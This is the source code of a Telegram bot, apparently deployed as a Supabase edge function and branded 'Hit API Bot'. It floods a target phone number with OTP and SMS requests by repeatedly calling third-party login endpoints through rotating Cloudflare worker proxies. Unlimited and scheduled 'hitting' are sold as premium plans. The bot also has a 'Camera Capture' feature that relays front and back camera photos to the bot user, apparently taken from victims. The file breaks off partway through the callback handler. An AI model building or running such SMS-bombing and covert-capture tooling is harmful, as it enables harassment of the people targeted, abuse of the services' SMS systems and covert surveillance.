import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN')!;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const supabase = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
);

// ===== REQUEST-LEVEL CACHE =====
// Eliminates duplicate DB reads within a single webhook invocation
const settingsCache = new Map<string, any>();

async function getSetting(key: string): Promise<any> {
  if (settingsCache.has(key)) return settingsCache.get(key);
  const { data } = await supabase.from('app_settings').select('setting_value').eq('setting_key', key).single();
  const val = data?.setting_value ?? null;
  settingsCache.set(key, val);
  return val;
}

// Batch fetch multiple settings in ONE query
async function getSettings(keys: string[]): Promise<Record<string, any>> {
  const uncached = keys.filter(k => !settingsCache.has(k));
  if (uncached.length > 0) {
    const { data } = await supabase.from('app_settings').select('setting_key, setting_value').in('setting_key', uncached);
    const map: Record<string, any> = {};
    for (const row of (data || [])) {
      map[row.setting_key] = row.setting_value;
      settingsCache.set(row.setting_key, row.setting_value);
    }
    // Cache nulls for keys not found
    for (const k of uncached) {
      if (!settingsCache.has(k)) settingsCache.set(k, null);
    }
  }
  const result: Record<string, any> = {};
  for (const k of keys) result[k] = settingsCache.get(k) ?? null;
  return result;
}

// Upsert instead of select+update/insert (saves 1 query per write)
async function setSetting(key: string, value: any) {
  settingsCache.set(key, value);
  await supabase.from('app_settings').upsert(
    { setting_key: key, setting_value: value },
    { onConflict: 'setting_key' }
  );
}

// ===== Telegram Helpers =====
async function sendMessage(chatId: number, text: string, replyMarkup?: any) {
  const body: any = { chat_id: chatId, text, parse_mode: 'HTML' };
  if (replyMarkup) body.reply_markup = replyMarkup;
  const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function answerCallbackQuery(id: string, text?: string) {
  // Fire and forget — don't await
  fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: id, text }),
  }).catch(() => {});
}

async function editMessage(chatId: number, messageId: number, text: string, replyMarkup?: any) {
  const body: any = { chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' };
  if (replyMarkup) body.reply_markup = replyMarkup;
  await fetch(`${TELEGRAM_API}/editMessageText`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
}

async function sendPhoto(chatId: number, photoUrl: string, caption?: string) {
  const body: any = { chat_id: chatId, photo: photoUrl };
  if (caption) { body.caption = caption; body.parse_mode = 'HTML'; }
  const res = await fetch(`${TELEGRAM_API}/sendPhoto`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return res.json();
}

// ===== Bot State =====
async function getBotState(chatId: number): Promise<any> {
  return (await getSetting(`tgbot_state_${chatId}`)) || {};
}

async function setBotState(chatId: number, state: any) {
  await setSetting(`tgbot_state_${chatId}`, state);
}

// ===== Admin Check =====
const OWNER_CHAT_ID = 8086397189;

function parseAdminIds(val: any): number[] {
  const ids = Array.isArray(val) ? val : [];
  if (!ids.includes(OWNER_CHAT_ID)) ids.push(OWNER_CHAT_ID);
  return ids;
}

async function getAdminIds(): Promise<number[]> {
  return parseAdminIds(await getSetting('tgbot_admin_ids'));
}

async function isAdmin(chatId: number): Promise<boolean> {
  return (await getAdminIds()).includes(chatId);
}

// ===== Bot Config =====
interface BotConfig {
  dailyLimit: number; defaultRounds: number; defaultBatch: number; defaultDelay: number;
  hitCooldownMinutes: number;
  services: { schedule: boolean; customSms: boolean; cameraCapture: boolean; hitApi: boolean };
}

function parseBotConfig(val: any): BotConfig {
  return {
    dailyLimit: val?.dailyLimit ?? 5,
    defaultRounds: val?.defaultRounds ?? 1,
    defaultBatch: val?.defaultBatch ?? 5,
    defaultDelay: val?.defaultDelay ?? 2,
    hitCooldownMinutes: val?.hitCooldownMinutes ?? 5,
    services: {
      schedule: val?.services?.schedule !== false,
      customSms: val?.services?.customSms !== false,
      cameraCapture: val?.services?.cameraCapture !== false,
      hitApi: val?.services?.hitApi !== false,
    },
    ...val,
  };
}

async function getBotConfig(): Promise<BotConfig> {
  return parseBotConfig(await getSetting('tgbot_config'));
}

// ===== FAST CONTEXT LOADER =====
// Loads all commonly needed data in ONE batch query
interface UserContext {
  admin: boolean;
  adminIds: number[];
  config: BotConfig;
  premium: { isPremium: boolean; plan: string | null };
  usage: { today: number; total: number };
  state: any;
}

async function loadUserContext(chatId: number): Promise<UserContext> {
  const today = getISTDate();
  const keys = [
    'tgbot_admin_ids',
    'tgbot_config',
    'tgbot_premium_users',
    `tgbot_usage_${chatId}`,
    `tgbot_state_${chatId}`,
  ];
  const settings = await getSettings(keys);

  const adminIds = parseAdminIds(settings['tgbot_admin_ids']);
  const admin = adminIds.includes(chatId);
  const config = parseBotConfig(settings['tgbot_config']);

  // Premium check
  const premUsers = (settings['tgbot_premium_users'] && typeof settings['tgbot_premium_users'] === 'object') ? settings['tgbot_premium_users'] : {};
  let premium = { isPremium: false, plan: null as string | null };
  const entry = premUsers[String(chatId)];
  if (entry) {
    if (new Date(entry.expiresAt) < new Date()) {
      delete premUsers[String(chatId)];
      // Fire and forget — don't block
      setSetting('tgbot_premium_users', premUsers).catch(() => {});
    } else {
      premium = { isPremium: true, plan: entry.plan };
    }
  }

  // Usage
  const usageVal = settings[`tgbot_usage_${chatId}`];
  const usage = (!usageVal || usageVal.date !== today)
    ? { today: 0, total: usageVal?.total || 0 }
    : { today: usageVal.today || 0, total: usageVal.total || 0 };

  const state = settings[`tgbot_state_${chatId}`] || {};

  return { admin, adminIds, config, premium, usage, state };
}

// ===== Cooldown Check =====
async function getLastHitTime(chatId: number): Promise<number> {
  return (await getSetting(`tgbot_last_hit_${chatId}`)) ?? 0;
}

async function setLastHitTime(chatId: number) {
  await setSetting(`tgbot_last_hit_${chatId}`, Date.now());
}

async function getCooldownRemaining(chatId: number, config?: BotConfig): Promise<number> {
  const cfg = config || await getBotConfig();
  const lastHit = await getLastHitTime(chatId);
  if (lastHit === 0) return 0;
  const cooldownMs = cfg.hitCooldownMinutes * 60 * 1000;
  return Math.max(0, cooldownMs - (Date.now() - lastHit));
}

// ===== IST Date Helper =====
function getISTDate(): string {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const ist = new Date(now.getTime() + istOffset);
  return ist.toISOString().slice(0, 10);
}

// ===== User Usage Tracking =====
async function incrementUsage(chatId: number, ctx?: UserContext) {
  const today = getISTDate();
  const val = await getSetting(`tgbot_usage_${chatId}`);
  const current = (val && val.date === today) ? val : { date: today, today: 0, total: val?.total || 0 };

  const isFreeUser = ctx ? (!ctx.premium.isPremium && !ctx.admin) : true;

  if (isFreeUser) {
    const config = ctx?.config || await getBotConfig();
    current.today = Math.min((current.today || 0) + 1, config.dailyLimit);
  } else {
    current.today = (current.today || 0) + 1;
  }

  current.total = (current.total || 0) + 1;
  current.date = today;
  await setSetting(`tgbot_usage_${chatId}`, current);
}

// ===== Stats (fire-and-forget for non-critical writes) =====
async function getGlobalStats(): Promise<{ totalHits: number; totalUsers: number }> {
  const val = await getSetting('tgbot_global_stats');
  return { totalHits: val?.totalHits || 0, totalUsers: val?.totalUsers || 0 };
}

function incrementGlobalHitsAsync(count: number) {
  // Non-blocking — doesn't slow down response
  (async () => {
    try {
      const stats = await getGlobalStats();
      stats.totalHits += count;
      await setSetting('tgbot_global_stats', stats);
    } catch {}
  })();
}

function trackUserAsync(chatId: number) {
  // Non-blocking user tracking
  (async () => {
    try {
      const key = 'tgbot_all_users';
      const val = await getSetting(key);
      const users: number[] = Array.isArray(val) ? val : [];
      if (!users.includes(chatId)) {
        users.push(chatId);
        await setSetting(key, users);
        const stats = await getGlobalStats();
        stats.totalUsers = users.length;
        await setSetting('tgbot_global_stats', stats);
      }
    } catch {}
  })();
}

// ===== Access Keys =====
async function getAccessKeys(): Promise<string[]> {
  const val = await getSetting('tgbot_access_keys');
  return Array.isArray(val) ? val : [];
}

// ===== Custom SMS Services =====
const CUSTOM_SMS_SERVICES = {
  mpokket: { label: 'mPokket', msgLabel: 'Hash Key', defaultMsg: 'OTP_REQUEST', note: 'mPokket OTP send hoga is number pe' },
  milkbasket: { label: 'Milkbasket', msgLabel: 'App Hash', defaultMsg: 'default', note: 'Milkbasket OTP send hoga is number pe' },
  digihaat: { label: 'Digihaat', msgLabel: 'Message', defaultMsg: 'hello', note: 'Digihaat OTP send hoga is number pe' },
} as const;

type CustomSmsService = keyof typeof CUSTOM_SMS_SERVICES;

function escapeHtml(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function getCustomSmsServiceKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '🟨 mPokket', callback_data: 'custom_sms_service:mpokket' }, { text: '🟩 Milkbasket', callback_data: 'custom_sms_service:milkbasket' }],
      [{ text: '🟦 Digihaat', callback_data: 'custom_sms_service:digihaat' }],
      [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
    ],
  };
}

function getCustomSmsServicePrompt() { return '📲 <b>Custom SMS</b>\n\nService select karo:'; }

function getCustomSmsNumberPrompt(service: CustomSmsService) {
  const sc = CUSTOM_SMS_SERVICES[service];
  return `📲 <b>Custom SMS (${sc.label})</b>\n\n📱 Phone number bhejo:\n<code>98765432xx</code>\n\n<i>${sc.note}</i>`;
}

function getCustomSmsMsgPrompt(service: CustomSmsService, phone: string) {
  const sc = CUSTOM_SMS_SERVICES[service];
  return `📲 <b>Custom SMS (${sc.label})</b>\n\n📱 Number: <code>${phone}</code>\n📝 ${sc.msgLabel} bhejo:\n<code>${escapeHtml(sc.defaultMsg)}</code>`;
}

// ===== CF Workers =====
async function getCfWorkers(): Promise<string[]> {
  const val = await getSetting('tgbot_cf_workers');
  return Array.isArray(val) ? val : [];
}

let workerIndex = 0;
async function getNextWorker(): Promise<string | null> {
  const workers = await getCfWorkers();
  if (workers.length === 0) return null;
  return workers[workerIndex++ % workers.length];
}

// ===== Hit Proxy Mode =====
async function getHitProxyMode(): Promise<'edge' | 'cloudflare'> {
  const { data } = await supabase.from('app_settings').select('setting_value').eq('setting_key', 'hit_site_settings').maybeSingle();
  return (data?.setting_value as any)?.hitProxyMode || 'edge';
}

async function setHitProxyMode(mode: 'edge' | 'cloudflare') {
  const { data } = await supabase.from('app_settings').select('id, setting_value').eq('setting_key', 'hit_site_settings').maybeSingle();
  if (data?.id) {
    const current = (data.setting_value as any) || {};
    current.hitProxyMode = mode;
    await supabase.from('app_settings').update({ setting_value: current }).eq('id', data.id);
  } else {
    await supabase.from('app_settings').insert({ setting_key: 'hit_site_settings', setting_value: { hitProxyMode: mode } });
  }
}

// ===== Premium =====
async function getPremiumUsers(): Promise<Record<string, { plan: string; expiresAt: string; userId: number }>> {
  const val = await getSetting('tgbot_premium_users');
  return (val && typeof val === 'object') ? val : {};
}

async function isPremium(chatId: number): Promise<{ isPremium: boolean; plan: string | null }> {
  const users = await getPremiumUsers();
  const entry = users[String(chatId)];
  if (!entry) return { isPremium: false, plan: null };
  if (new Date(entry.expiresAt) < new Date()) {
    delete users[String(chatId)];
    await setSetting('tgbot_premium_users', users);
    return { isPremium: false, plan: null };
  }
  return { isPremium: true, plan: entry.plan };
}

// ===== Hit APIs =====
async function getEnabledApis() {
  const { data } = await supabase.from('hit_apis').select('*').eq('enabled', true);
  return data || [];
}

function replacePlaceholders(text: string, phone: string): string {
  return text.replace(/\{PHONE\}/gi, phone);
}

function replaceInObj(obj: Record<string, unknown>, phone: string): Record<string, unknown> {
  const result: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    if (typeof v === 'string') result[k] = replacePlaceholders(v, phone);
    else if (typeof v === 'object' && v !== null && !Array.isArray(v)) result[k] = replaceInObj(v as Record<string, unknown>, phone);
    else result[k] = v;
  }
  return result;
}

async function hitSingleApi(api: any, phone: string, workerUrl?: string | null): Promise<{ name: string; success: boolean; status: number | null; time: number; error?: string }> {
  const url = replacePlaceholders(api.url, phone);
  const method = api.method || 'GET';
  const headers: Record<string, string> = {};
  if (api.headers && typeof api.headers === 'object') {
    for (const [k, v] of Object.entries(api.headers)) {
      headers[replacePlaceholders(k, phone)] = replacePlaceholders(String(v), phone);
    }
  }

  let body: string | undefined;
  const bodyType = api.body_type || 'none';
  if (bodyType !== 'none' && api.body) {
    const rawBody = typeof api.body === 'string' ? api.body : JSON.stringify(api.body);
    body = replacePlaceholders(rawBody, phone);
    if (bodyType === 'json' && !headers['Content-Type']) headers['Content-Type'] = 'application/json';
    if (bodyType === 'form-urlencoded' && !headers['Content-Type']) headers['Content-Type'] = 'application/x-www-form-urlencoded';
  }

  let finalUrl = url;
  const qp = api.query_params || {};
  if (Object.keys(qp).length > 0) {
    try {
      const u = new URL(url);
      for (const [k, v] of Object.entries(qp)) {
        u.searchParams.set(replacePlaceholders(k, phone), replacePlaceholders(String(v), phone));
      }
      finalUrl = u.toString();
    } catch {}
  }

  const start = Date.now();

  if (workerUrl) {
    try {
      const proxyBody: any = { url: finalUrl, method, headers };
      if (body && !['GET', 'DELETE'].includes(method)) { proxyBody.body = body; proxyBody.bodyType = bodyType; }
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 12000);
      const res = await fetch(workerUrl, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(proxyBody), signal: controller.signal,
      });
      clearTimeout(timer);
      const data = await res.json();
      return { name: api.name, success: data?.success ?? false, status: data?.status_code ?? null, time: data?.response_time ?? (Date.now() - start) };
    } catch (err) {
      return { name: api.name, success: false, status: null, time: Date.now() - start, error: err instanceof Error ? err.message : 'Unknown' };
    }
  }

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);
    const res = await fetch(finalUrl, {
      method, headers, body: ['GET', 'DELETE'].includes(method) ? undefined : body, signal: controller.signal,
    });
    clearTimeout(timer);
    await res.text();
    return { name: api.name, success: res.ok, status: res.status, time: Date.now() - start };
  } catch (err) {
    return { name: api.name, success: false, status: null, time: Date.now() - start, error: err instanceof Error ? err.message : 'Unknown' };
  }
}

// ===== Progress Bar =====
function makeProgressBar(success: number, total: number): string {
  const filled = total > 0 ? Math.round((success / total) * 10) : 0;
  return '▓'.repeat(filled) + '░'.repeat(Math.max(0, 10 - filled));
}

function makeStatusMessage(phone: string, batch: number, delay: number, modeLabel: string, round: number, success: number, fail: number, running: boolean): string {
  const total = success + fail;
  const bar = makeProgressBar(success, total);
  const status = running ? '⚡ RUNNING...' : '🛑 STOPPED';
  return `🚀 <b>${status}</b>\n\n📱 Number: <code>${phone}</code>\n🌐 Mode: ${modeLabel} | 📦 Batch: ${batch} | ⏱️ ${delay}s\n\n📊 <b>Progress:</b>\n${bar} ${total > 0 ? Math.round((success / total) * 100) : 0}%\n\n🔄 Rounds: <b>${round}</b>\n✅ Success: <b>${success}</b>\n❌ Failed: <b>${fail}</b>\n📈 Total Hits: <b>${total}</b>`;
}

// Self-invoke for continuous hitting
async function selfContinueHits(chatId: number, phone: string, batch: number, delay: number, totalRounds: number, totalSuccess: number, totalFail: number, statusMsgId: number, nextApiIndex: number, runId: string, startedAt: number) {
  const backendUrl = Deno.env.get('SUPABASE_URL') ?? '';
  const anonKey = Deno.env.get('SUPABASE_ANON_KEY') ?? Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '';
  try {
    fetch(`${backendUrl}/functions/v1/telegram-bot`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
      body: JSON.stringify({ _internal_continue: true, chatId, phone, batch, delay, totalRounds, totalSuccess, totalFail, statusMsgId, nextApiIndex, runId, startedAt }),
    }).catch(() => {});
  } catch {}
}

async function runHitsForPhone(chatId: number, phone: string, rounds = 1, batch = 5, delay = 2, isContinuous = false, prevRounds = 0, prevSuccess = 0, prevFail = 0, statusMsgId = 0, currentApiIndex = 0, runId = '', startedAt = 0) {
  const apis = await getEnabledApis();
  if (apis.length === 0) { await sendMessage(chatId, '❌ <b>No APIs configured!</b>'); return; }

  // Parallel: get proxy mode + admin/premium status
  const [proxyMode, ctx] = await Promise.all([getHitProxyMode(), loadUserContext(chatId)]);
  const modeLabel = proxyMode === 'cloudflare' ? '☁️ CF Worker' : '⚡ Edge Fn';
  const isFreeUser = !ctx.premium.isPremium && !ctx.admin;
  const FREE_TIME_LIMIT_MS = 5 * 60 * 1000;

  if (!isContinuous) {
    runId = crypto.randomUUID();
    startedAt = Date.now();
    // Parallel: increment usage + set cooldown + set state + send status
    await Promise.all([
      incrementUsage(chatId, ctx),
      setLastHitTime(chatId),
      setBotState(chatId, { running: true, waiting_phone: false, phone, batch, delay, runId, startedAt }),
    ]);
    const statusText = makeStatusMessage(phone, batch, delay, modeLabel, 0, 0, 0, true);
    const result = await sendMessage(chatId, statusText, { inline_keyboard: [[{ text: '🛑 STOP NOW', callback_data: 'stop_hit' }]] });
    statusMsgId = result?.result?.message_id || 0;
    currentApiIndex = 0;
  }

  // Free user time limit
  if (isFreeUser && startedAt > 0 && (Date.now() - startedAt) >= FREE_TIME_LIMIT_MS) {
    await setBotState(chatId, { running: false });
    if (statusMsgId) {
      try {
        const usedToday = Math.min(ctx.usage.today, ctx.config.dailyLimit);
        const finalText = makeStatusMessage(phone, batch, delay, modeLabel, prevRounds, prevSuccess, prevFail, false) + `\n\n⏰ <b>5 minute time limit reached!</b>\n📊 Used: ${usedToday}/${ctx.config.dailyLimit}\n💎 Premium lo unlimited hitting ke liye.\n💬 Contact: @xyzdark62`;
        await editMessage(chatId, statusMsgId, finalText, { inline_keyboard: [[{ text: '💎 Get Premium', callback_data: 'premium_menu' }, { text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
      } catch {}
    }
    return;
  }

  let successCount = prevSuccess;
  let failCount = prevFail;
  let roundsDone = prevRounds;

  // Hard-stop gate
  const stateBefore = await getBotState(chatId);
  if (!stateBefore?.running || !stateBefore?.runId || stateBefore.runId !== runId) {
    if (statusMsgId) {
      try {
        await editMessage(chatId, statusMsgId, makeStatusMessage(phone, batch, delay, modeLabel, roundsDone, successCount, failCount, false), {
          inline_keyboard: [[{ text: '🔄 Start Again', callback_data: `hit_again:${phone}:1:${batch}:${delay}` }, { text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
      } catch {}
    }
    return;
  }

  if (currentApiIndex === 0 && roundsDone > 0) {
    await new Promise(r => setTimeout(r, delay * 1000));
  }

  const batchApis = apis.slice(currentApiIndex, currentApiIndex + batch);
  const workerUrl = proxyMode === 'cloudflare' ? await getNextWorker() : null;
  const batchResults = await Promise.allSettled(batchApis.map(api => hitSingleApi(api, phone, workerUrl)));

  for (const r of batchResults) {
    if (r.status === 'fulfilled') { r.value.success ? successCount++ : failCount++; } else { failCount++; }
  }

  let nextApiIndex = currentApiIndex + batch;
  if (nextApiIndex >= apis.length) { nextApiIndex = 0; roundsDone++; }

  // Non-blocking: update status + global stats in parallel
  if (statusMsgId) {
    editMessage(chatId, statusMsgId, makeStatusMessage(phone, batch, delay, modeLabel, roundsDone, successCount, failCount, true), {
      inline_keyboard: [[{ text: '🛑 STOP NOW', callback_data: 'stop_hit' }]],
    }).catch(() => {});
  }
  incrementGlobalHitsAsync(successCount - prevSuccess + failCount - prevFail);

  // Hard-stop gate after batch
  const stateAfter = await getBotState(chatId);
  if (!stateAfter?.running || !stateAfter?.runId || stateAfter.runId !== runId) {
    if (statusMsgId) {
      try {
        await editMessage(chatId, statusMsgId, makeStatusMessage(phone, batch, delay, modeLabel, roundsDone, successCount, failCount, false), {
          inline_keyboard: [[{ text: '🔄 Start Again', callback_data: `hit_again:${phone}:1:${batch}:${delay}` }, { text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
      } catch {}
    }
    return;
  }

  selfContinueHits(chatId, phone, batch, delay, roundsDone, successCount, failCount, statusMsgId, nextApiIndex, runId, startedAt);
}

// ===== Main Menu Keyboard =====
async function getMainMenuKeyboard(admin: boolean, chatId?: number, ctx?: UserContext) {
  const config = ctx?.config || await getBotConfig();
  const svc = config.services;
  
  // Parallel fetch mode + state
  const [mode, state] = await Promise.all([
    getHitProxyMode(),
    chatId ? getBotState(chatId) : Promise.resolve(null),
  ]);
  const modeIcon = mode === 'cloudflare' ? '☁️' : '⚡';
  const modeText = mode === 'cloudflare' ? 'CF Worker' : 'Edge Fn';
  const isHitting = !!state?.running;

  const topRow: any[] = [];
  if (svc.hitApi) topRow.push({ text: '🚀 Start', callback_data: 'start_hit' });
  if (isHitting) topRow.push({ text: '🛑 Stop', callback_data: 'stop_hit' });
  if (topRow.length === 0) topRow.push({ text: '🔥 Menu', callback_data: 'main_menu' });

  const keyboard: any[][] = [
    topRow,
    [{ text: `${modeIcon} Mode: ${modeText}`, callback_data: 'toggle_mode' }],
  ];

  const serviceRow: any[] = [];
  if (svc.schedule) serviceRow.push({ text: '📅 Schedule', callback_data: 'schedule_hit' });
  if (svc.customSms) serviceRow.push({ text: '📲 Custom SMS', callback_data: 'custom_sms' });
  if (serviceRow.length > 0) keyboard.push(serviceRow);
  if (svc.cameraCapture) keyboard.push([{ text: '📷 Camera Capture', callback_data: 'camera_capture' }]);

  if (admin) {
    keyboard.push(
      [{ text: '💎 Premium', callback_data: 'premium_menu' }],
      [{ text: '📊 Stats', callback_data: 'stats' }, { text: '⚙️ Settings', callback_data: 'settings' }],
      [{ text: '🔧 Services', callback_data: 'service_toggles' }],
      [{ text: '🥇 Give Unlimited', callback_data: 'give_unlimited' }],
      [{ text: '🗑️ Remove Premium', callback_data: 'remove_premium_prompt' }],
      [{ text: '📢 Broadcast', callback_data: 'broadcast_prompt' }, { text: '☁️ Workers', callback_data: 'workers' }],
      [{ text: '📊 Set Limit', callback_data: 'set_limit_prompt' }],
      [{ text: '🔐 Admin Panel', callback_data: 'admin_panel' }],
    );
  } else {
    keyboard.push(
      [{ text: '💎 Premium', callback_data: 'premium_menu' }],
      [{ text: '📊 Stats', callback_data: 'stats' }],
    );
  }

  return { inline_keyboard: keyboard };
}

// ===== MAIN HANDLER =====
serve(async (req) => {
  // Clear request-level cache for each new request
  settingsCache.clear();

  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  if (req.method === 'GET') {
    const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
    const webhookUrl = `${supabaseUrl}/functions/v1/telegram-bot`;
    const url = new URL(req.url);
    if (url.searchParams.get('action') === 'setwebhook') {
      const res = await fetch(`${TELEGRAM_API}/setWebhook`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: webhookUrl }),
      });
      return new Response(JSON.stringify(await res.json()), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }
    return new Response(JSON.stringify({ webhook_url: webhookUrl }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }

  try {
    const update = await req.json();

    // ===== Internal self-continue =====
    if (update._internal_continue) {
      const { chatId, phone, batch, delay, totalRounds, totalSuccess, totalFail, statusMsgId, nextApiIndex, runId, startedAt } = update;
      await runHitsForPhone(chatId, phone, 1, batch, delay, true, totalRounds, totalSuccess, totalFail, statusMsgId || 0, nextApiIndex || 0, runId || '', startedAt || 0);
      return new Response('OK', { headers: corsHeaders });
    }

    // ===== Internal photo notification =====
    if (update._internal_photo_notify) {
      const { chatId, photoUrl, cameraType, captureNum } = update;
      if (chatId && photoUrl) {
        const caption = `📷 <b>Camera Capture</b>\n\n📸 ${cameraType === 'front' ? 'Front' : 'Back'} Camera #${captureNum || 1}\n⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
        await sendPhoto(chatId, photoUrl, caption);
      }
      return new Response('OK', { headers: corsHeaders });
    }

    const url = new URL(req.url);
    if (url.searchParams.get('action') === 'setwebhook') {
      const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
      const webhookUrl = `${supabaseUrl}/functions/v1/telegram-bot`;
      const res = await fetch(`${TELEGRAM_API}/setWebhook`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: webhookUrl }),
      });
      return new Response(JSON.stringify(await res.json()), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // ========== CALLBACK QUERIES ==========
    if (update.callback_query) {
      const cb = update.callback_query;
      const chatId = cb.message.chat.id;
      const msgId = cb.message.message_id;
      const data = cb.data;

      // Load all context in ONE batch query + answer callback in parallel
      const [ctx] = await Promise.all([
        loadUserContext(chatId),
        answerCallbackQuery(cb.id),
      ]);
      const admin = ctx.admin;

      // Non-blocking user tracking
      trackUserAsync(chatId);

      // --- Main Menu ---
      if (data === 'main_menu') {
        let menuText = '🔥 <b>Hit API Bot</b>\n\n';
        if (ctx.premium.isPremium || admin) {
          menuText += '💎 <b>Unlimited</b> access\n';
        } else {
          const usedToday = Math.min(ctx.usage.today, ctx.config.dailyLimit);
          menuText += `📊 Daily Limit: <b>${usedToday}/${ctx.config.dailyLimit}</b>\n`;
        }
        menuText += '\nSelect an option:';
        await editMessage(chatId, msgId, menuText, await getMainMenuKeyboard(admin, chatId, ctx));
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Toggle Mode ---
      if (data === 'toggle_mode') {
        if (!admin) return new Response('OK', { headers: corsHeaders });
        const currentMode = await getHitProxyMode();
        const newMode = currentMode === 'edge' ? 'cloudflare' : 'edge';
        await setHitProxyMode(newMode);
        const modeLabel = newMode === 'cloudflare' ? '☁️ CF Worker' : '⚡ Edge Function';
        await editMessage(chatId, msgId, `🔄 <b>Mode Changed!</b>\n\n🌐 Now using: <b>${modeLabel}</b>\n\n<i>Website aur bot dono isi mode se hit karenge.</i>`, await getMainMenuKeyboard(admin, chatId, ctx));
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Start Hit ---
      if (data === 'start_hit') {
        if (!ctx.config.services.hitApi) {
          await editMessage(chatId, msgId, '❌ <b>Hit API is disabled by admin.</b>', { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        const cooldown = await getCooldownRemaining(chatId, ctx.config);
        if (cooldown > 0 && !ctx.premium.isPremium && !admin) {
          const mins = Math.ceil(cooldown / 60000);
          const secs = Math.ceil(cooldown / 1000);
          await editMessage(chatId, msgId, `⏳ <b>Cooldown Active!</b>\n\n${mins > 1 ? `${mins} minute` : `${secs} second`} baad try karo.\n\n💎 Premium = No Cooldown!`, {
            inline_keyboard: [[{ text: '💎 Get Premium', callback_data: 'premium_menu' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
          });
          return new Response('OK', { headers: corsHeaders });
        }
        await setBotState(chatId, { waiting_phone: true });
        await editMessage(chatId, msgId, '📱 <b>Phone number bhejo</b>\n\n<code>98765432xx</code>', {
          inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'main_menu' }]],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Stop ---
      if (data === 'stop_hit') {
        await setBotState(chatId, { running: false, waiting_phone: false });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Custom SMS ---
      if (data === 'custom_sms') {
        if (!ctx.config.services.customSms) {
          await editMessage(chatId, msgId, '❌ <b>Custom SMS is disabled by admin.</b>', { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        await setBotState(chatId, { waiting_custom_sms_service: true });
        await editMessage(chatId, msgId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
        return new Response('OK', { headers: corsHeaders });
      }

      if (data.startsWith('custom_sms_service:')) {
        const service = data.split(':')[1] as CustomSmsService;
        if (!(service in CUSTOM_SMS_SERVICES)) {
          await editMessage(chatId, msgId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
          return new Response('OK', { headers: corsHeaders });
        }
        await setBotState(chatId, { waiting_custom_sms_number: true, customSmsService: service });
        await editMessage(chatId, msgId, getCustomSmsNumberPrompt(service), {
          inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'custom_sms' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      // --- Schedule Hit ---
      if (data === 'schedule_hit') {
        if (!ctx.config.services.schedule) {
          await editMessage(chatId, msgId, '❌ <b>Schedule Hit is disabled by admin.</b>', { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
          return new Response('OK', { headers: corsHeaders });
        }
        if (!ctx.premium.isPremium && !admin) {
          await editMessage(chatId, msgId, '🔒 <b>Premium Feature!</b>\n\n📅 Schedule Hit sirf <b>Unlimited</b> plan users ke liye hai.\n\n🥇 <b>Unlimited Plan - ₹199</b>\n• Unlimited hits\n• Schedule hitting\n• All features\n\n💬 Contact: @xyzdark62', {
            inline_keyboard: [[{ text: '💎 Get Premium', callback_data: 'premium_menu' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
          });
          return new Response('OK', { headers: corsHeaders });
        }
        const { data: activeSchedules } = await supabase.from('scheduled_hits').select('*').eq('is_active', true);
        const count = activeSchedules?.length || 0;
